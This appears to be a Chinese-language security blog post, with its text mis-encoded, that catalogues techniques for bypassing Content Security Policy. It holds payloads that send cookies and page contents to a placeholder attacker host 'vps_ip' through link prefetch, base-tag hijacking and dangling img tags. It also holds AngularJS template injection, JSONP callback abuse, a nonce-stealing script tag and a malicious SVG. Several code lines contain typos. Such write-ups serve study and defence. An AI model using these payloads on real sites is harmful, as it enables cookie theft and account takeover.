<h3 id="0X01-linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡"><a href="#0X01-linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡" class="headerlink" title="0X01 linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡"></a>0X01 linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡</h3><ul>
<li>â–² æ–¹æ³•è¾ƒè€ï¼Œä¸ä¸€å®šèƒ½æˆåŠŸå®ç°ï¼Œç°åœ¨å¤§éƒ¨åˆ†æµè§ˆå™¨çš„CSPå¼€å§‹çº¦æŸè¿™ä¸ªæ ‡ç­¾</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥æ‰§è¡Œä»»æ„JSè„šæœ¬ï¼Œä½†æ˜¯ç”±äºå—åˆ°CSPå½±å“æ— æ³•å¤–å¸¦æ•°æ®</li>
</ul>
</li>
<li>åˆ©ç”¨æ ‡ç­¾å°†æ•°æ®å¤–å¸¦</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----SCPçš„é™åˆ¶</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-scr &apos;self&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----å†™æ­»çš„å¤–å¸¦linkæ ‡ç­¾</span><br><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----ä¸å†™æ­»çš„å¤–å¸¦linkæ ‡ç­¾</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;,&quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;,&quot;//vps_ip?&quot;+document.cookie);</span><br><span class="line">documnet.head.appendChild(link);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X02-ä½¿ç”¨iframeç»•è¿‡"><a href="#0X02-ä½¿ç”¨iframeç»•è¿‡" class="headerlink" title="0X02 ä½¿ç”¨iframeç»•è¿‡"></a>0X02 ä½¿ç”¨iframeç»•è¿‡</h3><ul>
<li>èƒŒæ™¯ï¼šå½“ä¸€ä¸ªåŒæºç«™ç‚¹ï¼ŒåŒæ—¶å­˜åœ¨ä¸¤ä¸ªé¡µé¢ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰CSPä¿æŠ¤çš„Aé¡µé¢ï¼Œå¦ä¸€ä¸ªæ²¡æœ‰CSPä¿æŠ¤Bé¡µé¢ï¼Œé‚£ä¹ˆå¦‚æœBé¡µé¢å­˜åœ¨XSSæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨Bé¡µé¢æ–°å»ºiframeç”¨javascriptç›´æ¥æ“ä½œAé¡µé¢çš„domï¼Œå¯ä»¥è¯´Aé¡µé¢çš„CSPé˜²æŠ¤å®Œå…¨å¤±æ•ˆ</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ä¸€ä¸ªåŒæºç«™ç‚¹å†…å­˜åœ¨ä¸¤ä¸ªé¡µé¢ï¼Œä¸€ä¸ªé¡µé¢å­˜åœ¨CSPä¿æŠ¤ï¼Œå¦ä¸€ä¸ªé¡µé¢æ²¡æœ‰CSPä¿æŠ¤ä¸”å­˜åœ¨XSSæ¼æ´ï¼ˆå­˜åœ¨XSSæ¼æ´åŸå› æ˜¯éœ€è¦æ‰§è¡ŒJSä»£ç ï¼‰</li>
<li>æˆ‘ä»¬éœ€è¦çš„æ•°æ®åœ¨å­˜åœ¨CSPä¿æŠ¤çš„é¡µé¢</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php  -&gt; Aé¡µé¢</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;h1 id=&quot;flag&quot;&gt;flag&#123;this_is_flag&#125;&lt;/h1&gt;</span><br><span class="line">---test1.www.xyz/3.php  -&gt; Bé¡µé¢</span><br><span class="line">//æ¨¡æ‹ŸXSS</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    iframe.src = &quot;1.php&quot;;</span><br><span class="line">    document.body.appenChild(iframe);</span><br><span class="line">    setTimeout(()=&gt;alert(iframe.contentView.document.getElementById(&apos;flag&apos;).innertHTML),1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/iframe-alert.png" alt="iframe-alert"></p>
<h3 id="OXO3-ç”¨CDNæ¥ç»•è¿‡"><a href="#OXO3-ç”¨CDNæ¥ç»•è¿‡" class="headerlink" title="OXO3 ç”¨CDNæ¥ç»•è¿‡"></a>OXO3 ç”¨CDNæ¥ç»•è¿‡</h3><ul>
<li>èƒŒæ™¯<ul>
<li>å‰ç«¯ä¼šç”¨åˆ°è®¸å¤šçš„å‰ç«¯æ¡†æ¶å’Œåº“ï¼Œå¼•ç”¨åˆ°å…¶ä»–CDNä¸Šçš„JSæ¡†æ¶</li>
<li>CDNä¸Šå¦‚æœå­˜åœ¨ä¸€äº›ä½ç‰ˆæœ¬çš„æ¡†æ¶ï¼Œå°±å¯èƒ½å­˜åœ¨ç»•è¿‡CSPçš„é£é™©</li>
</ul>
</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>CDNæœåŠ¡å•†å­˜åœ¨æŸäº›ä½ç‰ˆæœ¬çš„jsåº“</li>
<li>CDNæœåŠ¡å•†åœ¨CSPç™½åå•ä¸­</li>
<li>è°ƒç”¨CDNæœåŠ¡å•†çš„jsåº“</li>
</ul>
</li>
<li>å¼•ç”¨orangeå¸ˆå‚…é‡‡ç”¨äº†ä½ç‰ˆæœ¬çš„angular jsæ¨¡æ¿æ³¨å…¥æ¥ç»•è¿‡CSP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœç”¨äº†Jquery-mobileåº“ï¼Œä¸”CSPä¸­åŒ…å«<code>&quot;script-src &#39;unsafe-eval&#39;&quot;æˆ–è€…&quot;script-src &#39;strict-dynamic&#39;&quot;</code>ï¼Œå¯ä»¥ç”¨æ­¤exp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">ä½ç‰ˆæœ¬angular jsçš„CDNæœåŠ¡å•†åˆ—è¡¨</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">åº“å¯ä»¥ç»•è¿‡CSPï¼ˆæ¥è‡ªblackhat2017ï¼‰</a></li>
</ul>
<h3 id="0X04-ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡"><a href="#0X04-ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡" class="headerlink" title="0X04 ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡"></a>0X04 ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</h3><ul>
<li>â–² æ„Ÿè§‰è·ŸCDNæ¥ç»•è¿‡çš„æ–¹å¼æœ‰ç‚¹åƒï¼Œéƒ½æ˜¯è°ƒç”¨å¤–éƒ¨çš„åº“æˆ–è€…åŒ…ï¼Œç„¶åå¯ä»¥å¼•ç”¨</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ç«™ç‚¹å­˜åœ¨å¯æ§é™æ€èµ„æº</li>
<li>ç«™ç‚¹åœ¨CSPç™½åå•ä¸­</li>
</ul>
</li>
<li>ä¾‹å­<ul>
<li>å¦‚æœå‰ç«¯çš„CSPä¸­ä½¿ç”¨åˆ°äº†<a href="http://www.google-analytics.com" target="_blank" rel="noopener">www.google-analytics.com</a></li>
<li>è€Œ<a href="http://www.google.analytics.comä¸­æä¾›äº†è‡ªå®šä¹‰javascriptçš„åŠŸèƒ½ï¼ˆgoogleä¼šå°è£…è‡ªå®šä¹‰çš„jsï¼Œæ‰€ä»¥è¿˜éœ€è¦unsafe-evalï¼‰ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡CSP" target="_blank" rel="noopener">www.google.analytics.comä¸­æä¾›äº†è‡ªå®šä¹‰javascriptçš„åŠŸèƒ½ï¼ˆgoogleä¼šå°è£…è‡ªå®šä¹‰çš„jsï¼Œæ‰€ä»¥è¿˜éœ€è¦unsafe-evalï¼‰ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡CSP</a></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//è®¿é—®www.google.analytics.comè‡ªå®šä¹‰jsçš„åŠŸèƒ½ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªid</span><br><span class="line">function test()&#123;</span><br><span class="line">    return alert(&quot;here&quot;)</span><br><span class="line">&#125;</span><br><span class="line">----test1.www.xyz/1.phpï¼ˆå°†è·å¾—çš„idå¡«å…¥ä¸‹é¢çš„é“¾æ¥ä¸­çš„idå³å¯ï¼‰</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>åŒç†ï¼Œè‹¥å…¶ä»–ç«™ç‚¹ä¸‹æä¾›äº†å¯æ§é™æ€èµ„æºçš„åŠŸèƒ½ï¼Œä¸”CSPä¸­å…è®¸äº†æ­¤ç«™ç‚¹</li>
<li>â–² 2020.06.05 <a href="http://www.google.analytics.comæš‚æ— æ³•è¿›è¡Œè®¿é—®" target="_blank" rel="noopener">www.google.analytics.comæš‚æ— æ³•è¿›è¡Œè®¿é—®</a></li>
</ul>
<h3 id="0X05-ç«™ç‚¹å¯æ§JSONPç»•è¿‡"><a href="#0X05-ç«™ç‚¹å¯æ§JSONPç»•è¿‡" class="headerlink" title="0X05 ç«™ç‚¹å¯æ§JSONPç»•è¿‡"></a>0X05 ç«™ç‚¹å¯æ§JSONPç»•è¿‡</h3><ul>
<li>å‰æï¼šå¤§éƒ¨åˆ†ç«™ç‚¹çš„jsonpæ˜¯å®Œå…¨å¯æ§çš„ï¼Œåªä¸è¿‡æœ‰äº›ç«™ç‚¹ä¼šè®©jsonpä¸è¿”å›htmlç±»å‹é˜²æ­¢ç›´æ¥çš„åå°„å‹XSSï¼Œä½†æ˜¯å¦‚æœå°†urlæ’å…¥åˆ°scriptæ ‡ç­¾ä¸­ï¼Œé™¤éè®¾ç½®x-content-type-optionså¤´ï¼Œå¦è€…å°½ç®¡è¿”å›ç±»å‹ä¸ä¸€è‡´ï¼Œæµè§ˆå™¨ä¾æ—§ä¼šå½“æˆjsè¿›è¡Œè§£æ</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ç«™ç‚¹å­˜åœ¨å¯æ§Jsonp</li>
<li>ç«™ç‚¹åœ¨CSPç™½åå•ä¸­</li>
</ul>
</li>
<li>ä¾‹å­ï¼šGoogleç«™ç‚¹å­˜åœ¨äº†ç”¨æˆ·å¯æ§jsonp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src https://www.google.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>â–² é…åˆæ³¨é‡Šï¼Œå¯ä»¥æ‰§è¡Œä»»æ„js</li>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">ä¸€äº›å­˜åœ¨ç”¨æˆ·å¯æ§èµ„æºæˆ–è€…jsonpæ¯”è¾ƒå¸¸ç”¨ç«™ç‚¹çš„githubé¡¹ç›®</a></li>
</ul>
<h3 id="0X06-Base-uriç»•è¿‡"><a href="#0X06-Base-uriç»•è¿‡" class="headerlink" title="0X06 Base-uriç»•è¿‡"></a>0X06 Base-uriç»•è¿‡</h3><blockquote>
<p>   æ— ç»å¯¹è·¯å¾„çš„ä¸å®Œæ•´èµ„æº</p>
</blockquote>
<ul>
<li>å½“æœåŠ¡å™¨CSPçš„script-srcé‡‡ç”¨äº†nonceæ—¶ï¼Œå¦‚æœåªè®¾ç½®äº†default-srcæ²¡æœ‰é¢å¤–è®¾ç½®base-uriï¼Œå°±å¯ä»¥ä½¿ç”¨<code>&lt;base&gt;</code>æ ‡ç­¾ä½¿å½“å‰é¡µé¢ä¸Šä¸‹æ–‡ä¸ºè‡ªå·±çš„vpsï¼Œå¦‚æœé¡µé¢ä¸­çš„åˆæ³•scriptæ ‡ç­¾é‡‡ç”¨äº†ç›¸å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆæœ€ç»ˆåŠ è½½çš„jså°±æ˜¯é’ˆå¯¹baseæ ‡ç­¾ä¸­æŒ‡å®šurlçš„ç›¸å¯¹è·¯å¾„</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>CSPä¸­çš„script-srcåªä½¿ç”¨nonce</li>
<li>æ²¡æœ‰é¢å¤–è®¾ç½®base-uri</li>
<li>é¡µé¢å¼•ç”¨å­˜åœ¨ç›¸å¯¹è·¯å¾„çš„<code>&lt;script&gt;</code>æ ‡ç­¾</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X07-ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce"><a href="#0X07-ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce" class="headerlink" title="0X07 ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce"></a>0X07 ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce</h3><ul>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯æ§ç‚¹åœ¨åˆæ³•scriptæ ‡ç­¾ä¸Šæ–¹,ä¸”å…¶ä¸­æ²¡æœ‰å…¶ä»–æ ‡ç­¾</li>
<li>XSSé¡µé¢çš„CSPçš„script-srcåªé‡‡ç”¨äº†nonceæ–¹å¼</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;nonce-xxxx&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;script nonce=&apos;xxxx&apos;&gt;</span><br><span class="line">    //do some thing</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¾“å…¥<code>http://test1.www.xyz/1.php?xss=&lt;script src=data:text/plain,alert(1)</code>ï¼Œå³é€ æˆxss</li>
<li>è§£é‡Šï¼šè¿™æ˜¯å› ä¸ºå½“æµè§ˆå™¨ç¢°åˆ°ä¸€ä¸ªå·¦å°–æ‹¬å·æ—¶ï¼Œä¼šå˜æˆæ ‡ç­¾å¼€å§‹çŠ¶æ€ï¼Œç„¶åä¼šä¸€ç›´æŒç»­åˆ°ç¢°åˆ°å³å°–æ‹¬å·ä¸ºæ­¢ï¼Œåœ¨å…¶ä¸­çš„æ•°æ®éƒ½ä¼šè¢«å½“æˆæ ‡ç­¾åæˆ–è€…å±æ€§ï¼Œæ‰€ä»¥ç¬¬äº”è¡Œçš„<code>&lt;script</code>ä¼šå˜æˆä¸€ä¸ªå±æ€§ï¼Œå€¼ä¸ºç©ºï¼Œä¹‹åçš„nonce=â€™xxxxxâ€™ä¼šè¢«å½“æˆæˆ‘ä»¬è¾“å…¥çš„scriptçš„æ ‡ç­¾çš„ä¸€ä¸ªå±æ€§ï¼Œç›¸å½“äºæˆ‘ä»¬ç›—å–äº†åˆæ³•çš„scriptæ ‡ç­¾ä¸­çš„nonceï¼Œäºæ˜¯æˆåŠŸç»•è¿‡äº†scripr-src</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-example.png" alt="nonce-example"></p>
<ul>
<li>â–² 2020.06.05 æœ¬å®éªŒåœ¨Firefoxä¸Šå®éªŒæˆåŠŸï¼Œåœ¨Chromeä¸Šä¸æˆåŠŸ<ul>
<li>å³ä½¿æ„é€ ç‰¹æ®Šçš„url<code>http://test1.www.xyz/1.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code>ï¼Œä¹Ÿæ— æ³•æˆåŠŸï¼Œè¿˜æ˜¯ä¼šå—åˆ°CSPå½±å“</li>
<li>ç‰¹æ®Šçš„urlè§£æï¼šå…ˆæ–°å»ºä¸€ä¸ªaå±æ€§ï¼Œç„¶åå†æ–°å»ºç¬¬äºŒä¸ªaå±æ€§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å°†ç¬¬äºŒä¸ª<code>&lt;script</code>èµ‹ç»™äº†ç¬¬äºŒä¸ªaå±æ€§ï¼Œæµè§ˆå™¨åœ¨è§£æçš„æ—¶å€™ç›´æ¥å¿½ç•¥äº†ç¬¬äºŒä¸ªå±æ€§åŠå…¶åé¢çš„å€¼ï¼Œè¿™æ ·Payloadå°±èƒ½æˆåŠŸåœ¨chromeæµè§ˆå™¨ä¸Šæ‰§è¡Œ</li>
<li>æ ‡ç­¾çš„ä¸€ä¸ªæŠ€å·§ï¼šå½“ä¸€ä¸ªæ ‡ç­¾å­˜åœ¨ä¸¤ä¸ªåŒåå±æ€§æ—¶ï¼Œç¬¬äºŒä¸ªå±æ€§çš„å±æ€§ååŠå…¶å±æ€§å€¼éƒ½ä¼šè¢«æµè§ˆå™¨å¿½ç•¥</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-chrome-error.png" alt="nonce-chrome-error"></p>
<h3 id="0X08-SVGç»•è¿‡"><a href="#0X08-SVGç»•è¿‡" class="headerlink" title="0X08 SVGç»•è¿‡"></a>0X08 SVGç»•è¿‡</h3><ul>
<li>SVGä½œä¸ºä¸€ä¸ªçŸ¢é‡å›¾ï¼Œä½†æ˜¯å´èƒ½å¤Ÿæ‰§è¡Œjavascriptè„šæœ¬ï¼Œå¦‚æœé¡µé¢ä¸­å­˜åœ¨ä¸Šä¼ åŠŸèƒ½ï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æ»¤svgï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„svgå›¾åƒæ¥xss</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥ä¸Šä¼ svgå›¾ç‰‡</li>
</ul>
</li>
<li>1.svg</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/svg-example.png" alt="svg-example"></p>
<h3 id="0X09-ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº"><a href="#0X09-ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº" class="headerlink" title="0X09 ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº"></a>0X09 ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº</h3><ul>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥åŠ è½½å¤–åŸŸèµ„æºï¼ˆimg-src: *ï¼‰</li>
<li>éœ€è¦è·å–é¡µé¢æŸå¤„çš„ä¿¡æ¯</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;;img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ³¨è§£ï¼šè¿™é‡Œå¯ä»¥æ³¨æ„åˆ°imgç”¨äº†*ï¼Œæœ‰äº›ç½‘ç«™ä¼šç”¨å¾ˆå¤šå¤–é“¾å›¾ç‰‡ï¼Œæ‰€ä»¥è¿™ä¸ªæƒ…å†µå¹¶ä¸å°‘è§<br>è™½ç„¶æˆ‘ä»¬å¯ä»¥æ–°å»ºä»»æ„æ ‡ç­¾ï¼Œä½†æ˜¯ç”±äºCSPæˆ‘ä»¬çš„JSå¹¶ä¸èƒ½æ‰§è¡Œï¼ˆæ²¡æœ‰unsafe-inlineï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ä¸å®Œæ•´çš„<code>&lt;img</code>æ ‡ç­¾æ¥å°†æ•°æ®å¸¦å‡º</li>
<li>æµè§ˆå™¨è®¿é—®ï¼š<code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//vps_ip?a=</code><ul>
<li>æ­¤æ—¶ï¼Œç”±äºsrcçš„å¼•å·æ²¡æœ‰é—­åˆï¼Œhtmlè§£æå™¨ä¼šå»ä¸€ç›´å¯»æ‰¾ç¬¬äºŒä¸ªå¼•å·ï¼Œå¼•å·å…¶ä¸­çš„å¤§éƒ¨åˆ†æ ‡ç­¾éƒ½ä¸ä¼šè¢«è§£æï¼Œæ‰€ä»¥åœ¨ç¬¬å››è¡Œçš„ç¬¬ä¸€ä¸ªå¼•å·å‰çš„æ‰€æœ‰å†…å®¹ï¼Œéƒ½ä¼šè¢«å½“æˆsrcçš„å€¼è¢«å‘é€åˆ°æˆ‘ä»¬çš„vpsä¸Š</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-example.png" alt="img-example"></p>
<ul>
<li>â–² 2020.06.05 æ­¤å®éªŒåœ¨Chromeä¸Šæ— æ³•æˆåŠŸæ‰§è¡Œï¼Œå› ä¸ºchromeä¸å…è®¸å‘å‡ºçš„urlä¸­å«æœ‰å›è½¦æˆ–<code>&lt;</code>ï¼Œå¦è€…ä¸ä¼šå‘å‡º</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-chrome-error.png" alt="img-chrome-error"> </p>
<h3 id="0X10-CRLFç»•è¿‡"><a href="#0X10-CRLFç»•è¿‡" class="headerlink" title="0X10 CRLFç»•è¿‡"></a>0X10 CRLFç»•è¿‡</h3><ul>
<li>å½“ä¸€ä¸ªé¡µé¢å­˜åœ¨CRLFæ¼æ´æ—¶ï¼Œä¸”æˆ‘ä»¬çš„å¯æ§ç‚¹åœ¨CSPä¸Šæ–¹ï¼Œå°±å¯ä»¥é€šè¿‡æ³¨å…¥å›è½¦æ¢è¡Œï¼Œå°†CSPæŒ¤åˆ°HTTPè¿”å›ä½“ä¸­ï¼Œè¿™æ ·å°±ç»•è¿‡äº†CSP</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥-1"><a href="#å‚è€ƒé“¾æ¥-1" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://xz.aliyun.com/t/5084#toc-11" target="_blank" rel="noopener">æˆ‘çš„CSPç»•è¿‡æ€è·¯åŠæ€»ç»“</a></li>
<li><a href="http://sunu11.com/2019/12/13/learning-CSP/" target="_blank" rel="noopener">learning_CSP</a></li>
<li><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">A Wormable XSS on HackMD!</a></li>
</ul>
]]></content>
      <categories>
        <category>Privilge</category>
      </categories>
  </entry>
</search>
